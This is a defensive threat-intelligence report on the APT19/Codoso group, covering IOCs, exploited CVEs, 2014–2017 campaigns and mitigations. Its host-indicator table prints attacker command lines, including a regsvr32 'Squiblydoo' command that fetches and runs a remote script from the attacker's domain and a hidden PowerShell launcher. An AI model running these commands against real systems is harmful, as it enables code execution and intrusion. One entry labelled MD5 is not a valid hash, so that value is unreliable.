## IOCs (Indicators of Compromise)

Indicators are taken from two independent primary reports: Mandiant/FireEye on the 2017 law-firm phishing campaign [1] and Palo Alto Unit 42 on C0d0so0 activity of 2015–2016 [2]. Forbes watering-hole artifacts come from press coverage of the iSIGHT/Invincea research [5]. Network values are defanged.

### Network indicators

| # | Type | Value | Context | Source |
|---|---|---|---|---|
| 1 | Domain | `autodiscover[.]2bunny[.]com` | Cobalt Strike BEACON C2 (`/submit.php`, `/IE9CompatViewList.xml`) | [1] |
| 2 | Domain | `lyncdiscover[.]2bunny[.]com` | Hosts the SCT payload loaded via Regsvr32 (`/Autodiscover`) | [1] |
| 3 | Domain | `tk-in-f156[.]2bunny[.]com` | Hosts the lure document downloaded by the RTF attachments | [1] |
| 4 | URL | `hxxp://tk-in-f156[.]2bunny[.]com/Agreement[.]doc` | RTF exploit (CVE-2017-0199) download URL | [1] |
| 5 | Domain | `sfo02s01-in-f2[.]cloudsend[.]net` | BEACON C2 (`/submit.php`); same domain used for phishing senders | [1] |
| 6 | Domain | `tf-in-f167[.]2bunny[.]com` | Seen only on VirusTotal, not in the wild (per Mandiant) | [1] |
| 7 | IP | `104[.]236[.]77[.]169` | Network indicator listed by Mandiant (role not specified) | [1] |
| 8 | IP | `138[.]68[.]45[.]9` | Network indicator listed by Mandiant (role not specified) | [1] |
| 9 | IP | `162[.]243[.]143[.]145` | Network indicator listed by Mandiant (role not specified) | [1] |
| 10 | Domain | `supermanbox[.]org` / `www.supermanbox[.]org` | C2 of the Port 22 variant (custom protocol, TCP/22) | [2] |
| 11 | Domain | `www.jbossas[.]org` | C2 of the Port 22 variant (TCP/22) | [2] |
| 12 | Domain | `www.microsoft-cache[.]com` | C2 of the HTTP variant | [2] |
| 13 | IP | `121[.]54[.]168[.]230` | Hong Kong IP to which the three C2 domains above resolved | [2] |
| 14 | IP | `218[.]54[.]139[.]20` | Hosted `/example/McAltLib.dll` (malware delivery) | [2] |
| 15 | IP | `210[.]181[.]184[.]64` | Hosted `/example/McAltLib.dll` (malware delivery) | [2] |
| 16 | IP | `42[.]200[.]18[.]194` | Hosted `/example/McAltLib.dll` (malware delivery) | [2] |

### Email indicators (2017 campaign)

| Type | Value | Source |
|---|---|---|
| Sender | `infodept@cloudsend[.]net` (display name "PressReader") | [1] |
| Sender | `noreply@cloudsend[.]net` | [1] |
| Sender | `angela.suh@`, `ashley.safronoff@`, `lindsey.hersh@`, `sarah.roberto@` + `cloudsend[.]net` | [1] |
| Attachment | `Macron_Authenticity.doc.rtf`, `Macron_Information.doc.rtf`, `Macron_Tax_Evasion.doc.rtf`, `Macron_secret_plans.doc.rtf` | [1] |
| Attachment | `US and EU Trade with China and China CA.xlsm`, `Project Codes - 05.30.17.xlsm`, `Weekly Vacancy Status Report 5-30-15.xlsm` | [1] |

### File hashes

| Type | Value | Description | Source |
|---|---|---|---|
| MD5 | `0bef39d0e10b1edfe77617f494d733a8` | RTF attachment | [1] |
| MD5 | `0e6da59f10e1c4685bb5b35a30fc8fb6` | RTF attachment | [1] |
| MD5 | `cebd0e9e05749665d893e78c452607e2` | RTF attachment | [1] |
| MD5 | `30f149479c02b741e897cdb9ecd22da7` | XLSM with obfuscated macro | [1] |
| MD5 | `38125a991efc6ab02f7134db0ebe21b6` | XLSM with PowerShell macro (ZLIB + Base64) | [1] |
| MD5 | `3a19eWJh8J6Mx9DrGXKEv3ojKmqw8Cv9pscK` | XLSX/XLSM with PowerShell macro | [1] |
| MD5 | `1554d6fe12830ae57284b389a1132d65` | SCT file (Squiblydoo) with Cobalt Strike code | [1] |
| MD5 | `bae0b39197a1ac9e24bdf9a9483b18ea` | BEACON / Meterpreter payload | [1] |
| MD5 | `1151619d06a461456b310096db6bc548` | BEACON / Meterpreter payload | [1] |
| SHA-256 | `3ea6b2b51050fe7c07e2cf9fa232de6a602aa5eff66a2e997b25785f7cf50daa` | Port 22 variant DLL, C2 supermanbox[.]org (compiled 2015-11-18) | [2] |
| SHA-256 | `3577845d71ae995762d4a8f43b21ada49d809f95c127b770aff00ae0b64264a3` | Port 22 variant DLL, C2 jbossas[.]org (compiled 2015-11-19) | [2] |
| SHA-256 | `ea67d76e9d2e9ce3a8e5f80ff9be8f17b2cd5b1212153fdf36833497d9c060c0` | Port 22 variant DLL, C2 supermanbox[.]org (compiled 2015-11-16) | [2] |
| SHA-256 | `b690394540cab9b7f8cc6c98fd95b4522b84d1a5203b19c4974b58829889da4c` | HTTP variant DLL, C2 microsoft-cache[.]com (compiled 2015-07-15) | [2] |
| SHA-256 | `de33dfce8143f9f929abda910632f7536ffa809603ec027a4193d5e57880b292` | HTTP variant DLL, C2 microsoft-cache[.]com (compiled 2015-07-15) | [2] |
| SHA-256 | `de984eda2dc962fde75093d876ec3fe525119de841a96d90dc032bfb993dbdac` | HTTP variant DLL, C2 microsoft-cache[.]com (compiled 2015-07-08) | [2] |
| SHA-256 | `ccf87057a4ab02e53bff5828d779a6e704b040aef863f66e8f571638d7d50cd2` | HTTP variant executable (~1.9 MB), C2 microsoft-cache[.]com | [2] |

### Host-based indicators

| Type | Value | Description | Source |
|---|---|---|---|
| Command line | `powershell.exe -NoP -NonI -W Hidden -Command ...` (Deflate + Base64) | XLSM macro launching the payload | [1] |
| Command line | `regsvr32.exe /s /n /u /i:hxxps://lyncdiscover[.]2bunny[.]com/Autodiscover scrobj.dll` | Application-whitelisting bypass ("Squiblydoo") | [1] |
| Named pipe | `msagent_<4 digits>` | Cobalt Strike BEACON | [1] |
| Process injection | `%windir%\syswow64\rundll32.exe`, `%windir%\sysnative\rundll32.exe` | BEACON injection targets | [1] |
| Registry | `HKCU\Software\Microsoft\Windows\CurrentVersion\Run\Windows Debug Tools` → `%LOCALAPPDATA%\fakerx86.exe` | HTTP variant persistence | [2] |
| Files | `%LOCALAPPDATA%\dbgeng.dll` + `fakerx86.exe` | HTTP variant, DLL side-loaded by a legitimate debugger | [2] |
| File / service | `McAltLib.dll` side-loaded by McAfee `mcs.exe`; service `Dncp` ("Dncp Client") | Port 22 variant persistence | [2] |
| File | `hrn.dll`, `wuservice.dll` | Payloads of the 2014 Forbes watering hole | [5], [2] |

> **Limitations:** the network indicators date from 2014–2017. Domains and IPs are very likely inactive or reassigned, so they are useful for historical analysis and retro-hunting, not for blocking today. File hashes remain valid because they identify specific files. Mandiant notes that tf-in-f167[.]2bunny[.]com was only observed in VirusTotal.

## Vulnerabilities and Exploits

| CVE | Product / description | How APT19/Codoso used it | Status | Source |
|---|---|---|---|---|
| **CVE-2017-0199** | Microsoft Office / WordPad remote code execution. Office 2007 SP3–2016 and Windows Vista–8.1. HTA content is executed through OLE objects in a crafted document. | Early May 2017 RTF attachments downloaded `Agreement.doc` from 2bunny[.]com and ran code. Still used in later waves in 2017. | Patched April 2017. Listed in CISA KEV. | [1], [3], [7] |
| **CVE-2014-9163** | Adobe Flash Player stack-based buffer overflow (before 13.0.0.259; 14.x–15.x before 15.0.0.246; Linux before 11.2.202.425). | Zero-day used in the Forbes.com "Thought of the Day" Flash widget watering hole (28 Nov – 1 Dec 2014). | Patched 9 Dec 2014 (APSB14-27). Listed in CISA KEV (end-of-life product). | [4], [5], [6] |
| **CVE-2015-0071** | Internet Explorer ASLR bypass (IE 9 and later). | Second zero-day chained with the Flash exploit to bypass ASLR in IE9+. | Patched February 2015 (Patch Tuesday). | [4], [5] |
| *(no CVE)* | Macro-enabled Excel (XLSM) documents | PowerShell launched from VBA macro, after the user clicks "Enable Content". Relies on user execution, not on a vulnerability. | n/a | [1] |
| *(no CVE)* | Regsvr32 "Squiblydoo" technique | Loads a remote SCT script to bypass application whitelisting (T1218.010). Abuse of a legitimate tool, not a vulnerability. | n/a | [1] |

> **Note on sources:** the original Mandiant blog contains a typo in the RTF section ("CVE-2017-1099"). The summary of the same post and the other sources confirm **CVE-2017-0199**, which is the value used here. The Forbes attribution to Codoso Team comes from iSIGHT Partners; MITRE groups Codoso under APT19.

## Recent Campaigns

| Period | Campaign | Details | Source |
|---|---|---|---|
| **Jun – Dec 2017** | Spearphishing of US law firms | Four waves (June, October, mid-November, late November) against the same group of law firms. Lures referenced Roy Moore, Harvey Weinstein and Hillary Clinton. Malicious Word documents delivered an open-source backdoor. Same toolset as June, with small tweaks to avoid detection. | [3] |
| **May – Jun 2017** | Spearphishing of law and investment firms | At least seven global firms targeted. Lures moved from RTF files exploiting CVE-2017-0199 (early May) to macro-enabled XLSM (late May), later with a Regsvr32 whitelisting bypass. At least one lure delivered Cobalt Strike. Lures used the Macron e-mail leak theme. No post-exploitation observed by FireEye. | [1] |
| **Nov 2015 – Jan 2016** | C0d0so0 attacks on several sectors | Telecom, high tech, education, manufacturing and legal-services targets. Two custom malware variants (HTTP and port 22) delivered through compromised websites. Some targets were servers, suggesting future watering holes. | [2] |
| **28 Nov – 1 Dec 2014** | Forbes.com watering hole | The Forbes Flash widget served two chained zero-days (CVE-2014-9163 and CVE-2015-0071) to visitors from US defense and financial firms. | [4], [5] |

> **Status:** the last activity I could attribute to APT19 in reliable sources dates to late 2017. MITRE, Malpedia and CISA (AA20-275A, 2020) describe the group's TTPs but do not report newer campaigns [8], [9], [10]. Some blogs claim ongoing activity without naming specific incidents, so I have not included them.

## Attack Surface and Recommendations

**Exposed attack surface:** (1) employee mailboxes, especially in law, finance and investment firms, and Office clients opening RTF/XLSM files; (2) employee web browsing with exposed plugins (Flash, IE) via compromised legitimate sites; (3) Windows endpoints with unrestricted PowerShell, Regsvr32 and Rundll32; (4) web servers, which Unit 42 saw targeted as possible future watering holes; (5) outbound network traffic (HTTP and TCP/22) used for C2.

| TTP | Exposed surface | Recommended mitigation (MITRE ID) |
|---|---|---|
| T1566.001 / T1204.002 Spearphishing Attachment, User Execution | Email, Office clients, users | Email attachment scanning and anti-malware (M1031, M1049); SPF/DKIM/DMARC (M1054); user training on targeted lures (M1017); block macros in files downloaded from the internet via Office Group Policy; patch CVE-2017-0199 (Mandiant's first recommendation) |
| T1189 Drive-by Compromise | Browsers and plugins | Exploit protection (M1050); keep software updated (M1051)†; application isolation/sandboxing (M1048)†; restrict risky web content (M1021)†; remove Flash (end-of-life) |
| T1059.001 PowerShell | Windows endpoints | Restrict or remove PowerShell where unneeded (M1042); allow only signed scripts (M1045); application control and Constrained Language Mode (M1038); restrict to administrators (M1026); enable script block logging |
| T1218.010 / .011 Regsvr32, Rundll32 | Windows endpoints | Exploit Protection / ASR rules to stop Regsvr32 bypassing application control (M1050); monitor `regsvr32.exe` execution and arguments (e.g. `/i:http... scrobj.dll`) |
| T1574.001 DLL Hijacking | Application directories | Restrict write permissions on application folders†; monitor DLLs loaded from unexpected paths†; application control (M1038)† |
| T1547.001 / T1543.003 Run keys, Windows Service | Registry, service manager | Monitor changes to Run keys and creation of new services (e.g. `Dncp`)†; least privilege† |
| T1071.001 / T1132.001 C2 over HTTP, Base64 | Network egress | Network intrusion prevention (M1031); egress filtering and proxy-log review; block known C2 indicators; restrict outbound TCP/22 from hosts that don't need it (analyst recommendation based on the Port 22 variant [2]) |

† Mitigation taken from the general ATT&CK mitigation catalog and not individually checked on the technique page. Verify it in the "Mitigations" section of each technique before submitting.

## References

1. Mandiant / FireEye, "Privileges and Credentials: Phished at the Request of Counsel", 6 June 2017. https://cloud.google.com/blog/topics/threat-intelligence/phished-at-the-request-of-counsel
2. Palo Alto Networks Unit 42, "New Attacks Linked to C0d0so0 Group", 22 January 2016. https://unit42.paloaltonetworks.com/new-attacks-linked-to-c0d0s0-group/
3. CyberScoop, "Roy Moore scandal used for phishing schemes aimed at U.S. law firms", 4 December 2017. https://cyberscoop.com/roy-moore-scandal-phishing-attacks-apt19-fireeye-harvey-weinstein/
4. Help Net Security, "Forbes.com compromised by Chinese cyber spies targeting US firms", 11 February 2015. https://www.helpnetsecurity.com/2015/02/11/forbescom-compromised-by-chinese-cyber-spies-targeting-us-firms/
5. Security Affairs, "Chinese hackers hit Forbes visitors with zero-day exploits", 12 February 2015. https://securityaffairs.com/33417/cyber-crime/chinese-hackers-hit-forbes.html
6. NVD, CVE-2014-9163. https://nvd.nist.gov/vuln/detail/CVE-2014-9163
7. NVD, CVE-2017-0199. https://nvd.nist.gov/vuln/detail/CVE-2017-0199
8. MITRE ATT&CK, APT19 (G0073) and technique pages T1566.001, T1059.001, T1218.010, mitigation M1050. https://attack.mitre.org/groups/G0073/
9. CISA, Alert AA20-275A, "Potential for China Cyber Response to Heightened U.S.–China Tensions". https://www.cisa.gov/news-events/cybersecurity-advisories/aa20-275a
10. Malpedia, APT19. https://malpedia.caad.fkie.fraunhofer.de/actor/apt19